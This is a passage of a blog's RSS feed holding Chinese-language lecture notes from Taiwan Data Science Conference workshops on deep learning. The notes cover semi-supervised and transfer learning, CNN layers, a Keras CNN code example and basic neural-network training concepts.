&lt;p&gt;但也不要一開始就加一堆 callbacks&lt;br /&gt;
尤其是 Learning Rate Scheduler&lt;br /&gt;
不好的 Learning Rate Scheduler 會導致不好的結果  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Semi-supervised Learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;解決的問題  &lt;ul&gt;
&lt;li&gt;收集到的標籤遠少於實際擁有的資料量  &lt;ul&gt;
&lt;li&gt;該如何增加 label 呢?  &lt;ul&gt;
&lt;li&gt;Crowd-sourcing  &lt;/li&gt;
&lt;li&gt;Semi-supervised learning  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;步驟  &lt;ul&gt;
&lt;li&gt;先用 labeled dataset to train model  &lt;ul&gt;
&lt;li&gt;至少 train 到一定的程度 (良心事業)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;拿 unlabeled dataset 來測試，挑出預測好的 unlabeled dataset  &lt;/li&gt;
&lt;li&gt;假設預測的都是對的 (unlabeled =&amp;gt; labeled)  &lt;ul&gt;
&lt;li&gt;有更多 labeled dataset 了!  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Repeat the above steps  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;注意事項  &lt;ul&gt;
&lt;li&gt;加入品質不佳的 labels 反而會讓 model 變差  &lt;/li&gt;
&lt;li&gt;要注意加入的資料有沒有偏差的情況，否則最後 train 出來的 model 會變成只偏向某一類的結果  &lt;/li&gt;
&lt;li&gt;慎選要加入的 samples  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Transfer Learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;“transfer”: use the knowledge learned from task A to tackle another task B  &lt;/li&gt;
&lt;li&gt;Use as Fixed Feature Extractor  &lt;ul&gt;
&lt;li&gt;A known model, like VGG, trained on ImageNet  &lt;/li&gt;
&lt;li&gt;ImageNet: 10 millions images with labels  &lt;/li&gt;
&lt;li&gt;取某一個 layer output 當作 feature vectors  &lt;/li&gt;
&lt;li&gt;Train a classifier based on the features extracted by a known model  &lt;/li&gt;
&lt;li&gt;當資料很少的時候這招很好用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use as Initialization  &lt;ul&gt;
&lt;li&gt;Initialize your net by the weights of a known model  &lt;/li&gt;
&lt;li&gt;Use your dataset to further train your model  &lt;/li&gt;
&lt;li&gt;Fine-tuning the known model  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Short Summary&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Unlabeled data (lack of y) =&amp;gt; Semi-supervised learning  &lt;/li&gt;
&lt;li&gt;Insufficient data (lack of both x and y) =&amp;gt; Transfer learning (focus on layer transfer)  &lt;ul&gt;
&lt;li&gt;Use as fixed feature extractor  &lt;/li&gt;
&lt;li&gt;Use as initialization  &lt;/li&gt;
&lt;li&gt;Resources: https://keras.io/applications/  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Convolutional Neural Network (CNN)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;只要 input 是二維以上，且要找特定的 Pattern 的話，就可以用 CNN，不侷限於影像。  &lt;/li&gt;
&lt;li&gt;DNN 的輸入是一維的向量,那二維的矩陣呢? 例如：圖形資料  &lt;/li&gt;
&lt;li&gt;將圖形轉換成一維向量  &lt;ul&gt;
&lt;li&gt;Weight 數過多,造成 training 所需時間太長  &lt;/li&gt;
&lt;li&gt;左上的圖形跟右下的圖形真的有關係嗎?  &lt;ul&gt;
&lt;li&gt;只要留下重要的地方就好了，不需要全部的 neuron 都連接起來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;圖的構成  &lt;ul&gt;
&lt;li&gt;線條 (Line Segment)  &lt;/li&gt;
&lt;li&gt;圖案 (Pattern)  &lt;/li&gt;
&lt;li&gt;物件 (Object)  &lt;/li&gt;
&lt;li&gt;場景 (Scene)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;辨識一個物件只需要幾個特定的圖案  &lt;/li&gt;
&lt;li&gt;Property  &lt;ul&gt;
&lt;li&gt;What: 圖案的類型  &lt;/li&gt;
&lt;li&gt;Where: 重複的圖案可能出現在很多不同的地方  &lt;/li&gt;
&lt;li&gt;Size: 大小的變化並沒有太多的影響  &lt;ul&gt;
&lt;li&gt;Subsampling  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Convolution in Computer Vision  &lt;ul&gt;
&lt;li&gt;Common applications  &lt;ul&gt;
&lt;li&gt;模糊化、銳利化、浮雕  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://setosa.io/ev/image-kernels/"&gt;http://setosa.io/ev/image-kernels/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Adding each pixel and its local neighbors which are weighted by a filter (kernel)  &lt;/li&gt;
&lt;li&gt;Perform this convolution process to every pixels  &lt;ul&gt;
&lt;li&gt;當 pixel 的 value 高的時候，代表 pattern 有出現在該位置  &lt;/li&gt;
&lt;li&gt;當 pixel 的 value 低的時候，代表 pattern 沒有出現在該位置  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A filter could be seen as a pattern  &lt;/li&gt;
&lt;li&gt;常拿來做 Edge Detection  &lt;ul&gt;
&lt;li&gt;edge = 亮度變化大的地方  &lt;/li&gt;
&lt;li&gt;凸顯兩像素之間的差異  &lt;/li&gt;
&lt;li&gt;如果覺得 gap 太小的話，可以再乘上一個 constant 將其凸顯出來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;相鄰兩像素值差異越大,convolution 後新像素絕對值越大  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Convolutional Layer  &lt;ul&gt;
&lt;li&gt;Convolution 執行越多次影像越小  &lt;/li&gt;
&lt;li&gt;Hyper-parameters of Convolutional Layer  &lt;ul&gt;
&lt;li&gt;Filter size  &lt;/li&gt;
&lt;li&gt;Zero-padding  &lt;ul&gt;
&lt;li&gt;Add additional zeros at the border of image  &lt;/li&gt;
&lt;li&gt;Zero-padding 不會影響 convolution 的性質  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Stride  &lt;ul&gt;
&lt;li&gt;Shrink the output of the convolutional layer  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Depth (total number of filters)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pooling Layer  &lt;ul&gt;
&lt;li&gt;Why do we need pooling layers?  &lt;ul&gt;
&lt;li&gt;Reduce the number of weights  &lt;/li&gt;
&lt;li&gt;Prevent overfitting  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Max pooling  &lt;ul&gt;
&lt;li&gt;Consider the existence of patterns in each region  &lt;/li&gt;
&lt;li&gt;在作 Classification 上用得到  &lt;ul&gt;
&lt;li&gt;因為我們在做分類的時候會找尋特定的 pattern 是否有出現在該圖片中  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;但是會有些資訊喪失  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Average Pooling  &lt;ul&gt;
&lt;li&gt;因為是取平均的關係，所以出來的結果很高的話，代表該區域的值都很高，所以 pattern 出現在該位置的可能性也很高  &lt;/li&gt;
&lt;li&gt;用來找尋一再重複出現的 pattern  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A CNN Example (Object Recognition)  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://cs231n.github.io/convolutional-networks/"&gt;CS321n, Standford&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Filters Visualization  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.rsipvision.com/exploring-deep-learning/"&gt;RSIP VISION&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;CNN in Keras&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Concatenate Datasets by Numpy Functions  &lt;ul&gt;
&lt;li&gt;hstack, dim(6,)  &lt;ul&gt;
&lt;li&gt;[1, 2, 3, 4, 5, 6], Labels  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;vstack, dim(2,3)  &lt;ul&gt;
&lt;li&gt;[[1, 2, 3], [4, 5, 6]], Pixel values  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;dstack, dim(1, 3, 2)  &lt;ul&gt;
&lt;li&gt;[[1, 2], [3, 4], [5, 6]], Dimensions  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Concatenating Input Datasets  &lt;ul&gt;
&lt;li&gt;利用 vstack 連接 pixel values;用 hstack 連接 labels  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Reshape the Training/Testing Inputs  &lt;ul&gt;
&lt;li&gt;利用影像的長寬資訊先將 RGB 影像分開,再利用 reshape 函式將一維向量轉換為二維矩陣,最後用 dstack 將 RGB image 連接成三維陣列  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Saving Each Data as Image  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;scipy.misc.imsave&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;PIL.Image&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Building Your Own CNN Model  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;#39;&amp;#39;&amp;#39;CNN model&amp;#39;&amp;#39;&amp;#39;  

# CNN  
model = Sequential()  
model.add(  
Convolution2D(  
    32,  
    3,  
    3,  
    border_mode=&amp;#39;same&amp;#39;,  # 有做 zero-padding 的意思  
    input_shape=X_train[0].shape)  
)  
model.add(Activation(&amp;#39;relu&amp;#39;))  
model.add(Convolution2D(32, 3, 3))  
model.add(Activation(&amp;#39;relu&amp;#39;))  
model.add(MaxPooling2D(pool_size=(2, 2)))  
model.add(Dropout(0.2))  

model.add(Flatten())  

# DNN  
model.add(Dense(512))  
model.add(Activation(&amp;#39;relu&amp;#39;))  
model.add(Dropout(0.5))  
model.add(Dense(10))  
model.add(Activation(&amp;#39;softmax&amp;#39;))  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Tips for Setting Hyper-parameters  &lt;ul&gt;
&lt;li&gt;影像的大小須要能夠被 2 整除數次  &lt;/li&gt;
&lt;li&gt;Convolutional Layer  &lt;ul&gt;
&lt;li&gt;比起使用一個 size 較大的 filter (7x7),可以先嘗試連續使用數個 size 小的 filter (3x3)  &lt;/li&gt;
&lt;li&gt;Stride 的值與 filter size 相關,通常 stride ≤ (W_f - 1)/2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Very deep CNN model (16+ Layers) 多使用 3x3 filter 與 stride 1  &lt;/li&gt;
&lt;li&gt;Zero-padding 與 pooling layer 是選擇性的結構  &lt;/li&gt;
&lt;li&gt;Zero-padding 的使用取決於是否要保留邊界的資訊  &lt;/li&gt;
&lt;li&gt;Pooling layer 旨在避免 overfitting 與降低 weights 的數量, 但也減少影像所包含資訊,一般不會大於 3x3  &lt;ul&gt;
&lt;li&gt;像圍棋就不太適合用 Pooling，因為可能會失真。所以 AlphaGo 其實只有用 Convolutional Layer，沒有用 Pooling Layer。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;嘗試修改有不錯效能的 model,會比建立一個全新的模型容易收斂,且 model weights 越多越難 tune 出好的參數  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Deep Learning Applications&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://visualqa.org/"&gt;Visual Question Answering&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Video Captioning  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://arxiv.org/pdf/1701.00160.pdf"&gt;Text-To-Image&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://arxiv.org/pdf/1511.06434.pdf"&gt;Vector Arithmetic for Visual Concepts&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Go Deeper in Deep Learning  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://neuralnetworksanddeeplearning.com/"&gt;Neural Networks and Deep Learning&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.iro.umontreal.ca/~bengioy/dlbook/"&gt;Deep Learning&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://speech.ee.ntu.edu.tw/~tlkagk/courses_MLSD15_2.html"&gt;Course: Machine learning and having it deep and structured&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://keras.io/"&gt;Keras documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/fchollet/keras"&gt;Keras GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/channel/UC2ggjtuuWvxrHHHiaDH1dlQ"&gt;台大電機李宏毅教授 Youtube 頻道&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://cs231n.stanford.edu/"&gt;Convolutional Neural Networks for Visual Recognition cs231n&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Q&amp;amp;A&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;如果 feature 數量不夠的話，可以做些簡單的運算增加 feature 的量，尤其是已經知道這樣的 feature 會對 training 有幫助的話。  &lt;/li&gt;
&lt;li&gt;Keras model 相關的操作  &lt;ul&gt;
&lt;li&gt;用 &lt;code&gt;model.save()&lt;/code&gt; 來將訓練好的 model 存起來  &lt;/li&gt;
&lt;li&gt;之後可用 &lt;code&gt;keras.models.load_model()&lt;/code&gt; 來讀入已經訓練好的 model  &lt;/li&gt;
&lt;li&gt;讀入之後可再用 &lt;code&gt;model.summary()&lt;/code&gt; 來確認一下 model 的資訊  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;model.layers[0].get_weights()&lt;/code&gt; 可以得到此 model 第 1 層的 weights  &lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;model.predict()&lt;/code&gt; 來預測結果  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;當資料太大無法一次讀進來時，可以用 &lt;a href="https://keras.io/models/sequential/#fit_generator"&gt;Fit Generator&lt;/a&gt;。  &lt;ul&gt;
&lt;li&gt;需要自己撰寫一個 generator  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Sun, 13 Aug 2017 17:08:45 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2017-08-13:posts/2017/08/13/deep-learning-hands-on-step-by-step-datasci-tw/</guid><category>Deep Learning</category><category>Keras</category><category>CNN</category><category>DNN</category></item><item><title>台灣資料科學年會之系列活動：深入淺出深度學習 (Dive into Deep Learning)</title><link>https://blog.m157q.tw/posts/2017/08/12/dive-into-deep-learning-datasci-tw/</link><description>&lt;ul&gt;
&lt;li&gt;Links  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://foundation.datasci.tw/dive-deep-learning-170812/"&gt;http://foundation.datasci.tw/dive-deep-learning-170812/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://dsc.kktix.cc/events/series-events-081213"&gt;https://dsc.kktix.cc/events/series-events-081213&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Slides  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://drive.google.com/file/d/0B9cCeTKOkfWIVF9CeXpXaC1lUVk/view?usp=sharing"&gt;DiveDL_0326_v1.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Regression&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;適用場景  &lt;ul&gt;
&lt;li&gt;股票預測  &lt;/li&gt;
&lt;li&gt;無人車方向調整  &lt;/li&gt;
&lt;li&gt;推薦系統  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;步驟  &lt;ul&gt;
&lt;li&gt;決定 Model  &lt;/li&gt;
&lt;li&gt;評估所使用的函數夠不夠好  &lt;ul&gt;
&lt;li&gt;Loss Funciton  &lt;ul&gt;
&lt;li&gt;output 分數低，代表 loss 少，所以比較好。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;找出表現最好的 Loss Function  &lt;ul&gt;
&lt;li&gt;利用 Gradient Descent 來找  &lt;ul&gt;
&lt;li&gt;縱軸為 L 的 output，橫軸為 w  &lt;/li&gt;
&lt;li&gt;L 對 w 偏微分，取得其切線斜率  &lt;/li&gt;
&lt;li&gt;切線斜率為負時，增加 w，來取得較低的 L output  &lt;/li&gt;
&lt;li&gt;切線斜率為正時，減少 w，來取得較低的 L output  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;非 Linear 的話，會出現 Local optimal 和 Global optimal 的狀況  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;得到 Model  &lt;/li&gt;
&lt;li&gt;Model Generalization  &lt;ul&gt;
&lt;li&gt;嘗試不同的 Model  &lt;/li&gt;
&lt;li&gt;太過複雜的 Model 會出現 Overfitting 的狀況  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Classification&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;分類  &lt;ul&gt;
&lt;li&gt;Binary Classification  &lt;ul&gt;
&lt;li&gt;Yes/No  &lt;/li&gt;
&lt;li&gt;Example  &lt;ul&gt;
&lt;li&gt;Spam Filtering  &lt;ul&gt;
&lt;li&gt;把 email 裡面的詞都當作一個 feature，透過 trained model 來得到 Boolean 的結果。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Multi-Class Classification  &lt;ul&gt;
&lt;li&gt;判斷是哪個種類  &lt;/li&gt;
&lt;li&gt;Example  &lt;ul&gt;
&lt;li&gt;餵入圖片，判斷是哪種動物  &lt;/li&gt;
&lt;li&gt;判斷新聞是屬於哪一種主題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Introduction to ML &amp;amp; DL&lt;/h1&gt;
&lt;h2&gt;Basic Deep Learning&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Stacked function learned by machine  &lt;/li&gt;
&lt;li&gt;Deep Learning 三步驟  &lt;ul&gt;
&lt;li&gt;Define a set of function  &lt;/li&gt;
&lt;li&gt;Godness of function  &lt;/li&gt;
&lt;li&gt;pick the best function  &lt;/li&gt;
&lt;li&gt;(和 ML 很像）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Step 1: Define a set of function&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Neural Network  &lt;ul&gt;
&lt;li&gt;Neuron: input, weights, bias, Activation function  &lt;/li&gt;
&lt;li&gt;將多個 Neuron 組合在一起，形成 Neuron Network  &lt;/li&gt;
&lt;li&gt;愈多層的話需要調整的參數越多  &lt;/li&gt;
&lt;li&gt;不同的 Connections 可以形成不同的 Neural Network  &lt;ul&gt;
&lt;li&gt;Fully-Connected Feedforward Network  &lt;ul&gt;
&lt;li&gt;每一個 Neuron 都跟前一個相連，會一直把數值傳下去。  &lt;/li&gt;
&lt;li&gt;Input Layer + Hidden Layers + Output Layer  &lt;/li&gt;
&lt;li&gt;"Deep" means multiple hidden layers  &lt;ul&gt;
&lt;li&gt;DNN 的 hidden layers 至少要大於 2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Deep?  &lt;ul&gt;
&lt;li&gt;Fat + Shallow vs Thin + Deep  &lt;ul&gt;
&lt;li&gt;在數學上被證明是可以用一層很寬的 layer 來取代多層的 layers，但為什麼不用？  &lt;/li&gt;
&lt;li&gt;因為只用一層的話會需要使用到更多的 Neurons。（可以用類似 Logic Gates 簡化的方式來想）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Examples  &lt;ul&gt;
&lt;li&gt;AlexNet (2012): 8 layers, 16.4%  &lt;/li&gt;
&lt;li&gt;VGG (2014): 19 layers, 7.3%  &lt;/li&gt;
&lt;li&gt;GoogleNet (2014): 22 layers, 6.7%  &lt;/li&gt;
&lt;li&gt;Residual Net (2015): 152 layers, 3.57%  &lt;ul&gt;
&lt;li&gt;人類自己把所有的 training data 看完後下去做測試，error rate 大概是 4~5%  &lt;/li&gt;
&lt;li&gt;首度超越人類  &lt;/li&gt;
&lt;li&gt;因為疊了很多層，所以可能有些資訊會在傳遞中遺失，所以使用了 Special structure，會把一些一開始就學到的很重要 information 直接保留下來，確保不會在傳遞過程中遺失。  &lt;/li&gt;
&lt;li&gt;使用 Softmax layer 來當 Output layer  &lt;ul&gt;
&lt;li&gt;可以對 output 的數值做 normalize，直接以機率的方式呈現結果。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example  &lt;ul&gt;
&lt;li&gt;Handwriting Digit Recognition  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Input =&amp;gt; Neuron Network =&amp;gt; Output  &lt;/li&gt;
&lt;li&gt;Neuron Network =&amp;gt; A function set containing the candidates  &lt;/li&gt;
&lt;li&gt;FAQ  &lt;ul&gt;
&lt;li&gt;要用幾層？每層要用多少 Neuron？  &lt;ul&gt;
&lt;li&gt;試誤 + 直覺  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;我們可以自己設計 neuron network structure 嗎？  &lt;ul&gt;
&lt;li&gt;有很多不同的結構可以選擇  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有辦法讓程式自動幫我們決定要使用哪種 structure  &lt;ul&gt;
&lt;li&gt;有，但還沒有被研究的非常透徹。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Step 2: goodness of function&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Loss  &lt;ul&gt;
&lt;li&gt;A good function should make the loss of all examples as small as possible.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Total Loss  &lt;ul&gt;
&lt;li&gt;As small as possible  &lt;/li&gt;
&lt;li&gt;Find a function in function set that minimizes total loss  &lt;/li&gt;
&lt;li&gt;Find the network parameter &lt;code&gt;θ*&lt;/code&gt; that minimize total loss  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Step 3: pick the best function&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Gradient Descent  &lt;ul&gt;
&lt;li&gt;Local minima  &lt;ul&gt;
&lt;li&gt;Very slow at the plateau  &lt;/li&gt;
&lt;li&gt;Stuck at saddle point  &lt;/li&gt;
&lt;li&gt;Stuck at local minima  &lt;/li&gt;
&lt;li&gt;Gradient descent never guarantee global minima  &lt;ul&gt;
&lt;li&gt;Use different &amp;amp; random initial point to reach different minima  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Even AlphaGo using this approach  &lt;ul&gt;
&lt;li&gt;其實 AI 並沒有那麼厲害，他們也是像探索戰爭迷霧那樣，一步一步去探索和嘗試的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Deep Learning Toolkit&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Backpropagation  &lt;ul&gt;
&lt;li&gt;An efficient way to compute &lt;code&gt;∂L/∂w&lt;/code&gt; in neural network  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Frameworks  &lt;ul&gt;
&lt;li&gt;TensorFlow  &lt;ul&gt;
&lt;li&gt;比較多人在用且資料比較多  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Torch  &lt;/li&gt;
&lt;li&gt;Pytorch  &lt;ul&gt;
&lt;li&gt;比較多人在用且資料比較多  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Theano  &lt;ul&gt;
&lt;li&gt;AlexNet 的作者  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Microsoft CNTK  &lt;/li&gt;
&lt;li&gt;Caffe  &lt;/li&gt;
&lt;li&gt;DSSTNE  &lt;/li&gt;
&lt;li&gt;mxnet  &lt;/li&gt;
&lt;li&gt;Chainer  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有 input 和 output，就可以使用這些工具幫你找尋合適的 Function Set  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Keras&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;TensorFlow 和 Theano 的 Wrapper  &lt;/li&gt;
&lt;li&gt;非常容易寫  &lt;/li&gt;
&lt;li&gt;雖然可以細部調整的地方沒有直接使用 TensorFlow 和 Theano 來的多，但有足夠的彈性做一些調整。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Learning Recipe&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;在 Training Data 上的表現好嗎？  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不好  &lt;ul&gt;
&lt;li&gt;重新 train  &lt;/li&gt;
&lt;li&gt;可能原因  &lt;ul&gt;
&lt;li&gt;no good function exists: bad hypothesis function set =&amp;gt; reconstruct the model architecture  &lt;/li&gt;
&lt;li&gt;cannot find a good function: local optima =&amp;gt; change the training strategy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 Testing Data 上的表現好嗎？  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不好的話就是 Overfitting，要重新 train model  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Overfitting&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;High variance  &lt;/li&gt;
&lt;li&gt;可能的解法  &lt;ul&gt;
&lt;li&gt;more training samples  &lt;/li&gt;
&lt;li&gt;dropout  &lt;ul&gt;
&lt;li&gt;每次 random 讓數個 node 不工作  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;降維  &lt;ul&gt;
&lt;li&gt;PCA  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Concluding Remarks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;3 steps of Basic Machine Learning 很重要  &lt;/li&gt;
&lt;li&gt;Stacked functions  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Part II: Variants of Neural Nets&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Convolutional Neural Network (CNN)  &lt;/li&gt;
&lt;li&gt;Recurrent Neural Network (RNN)  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Convolutional Neural Network (CNN)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;在影像處理上被廣泛使用  &lt;/li&gt;
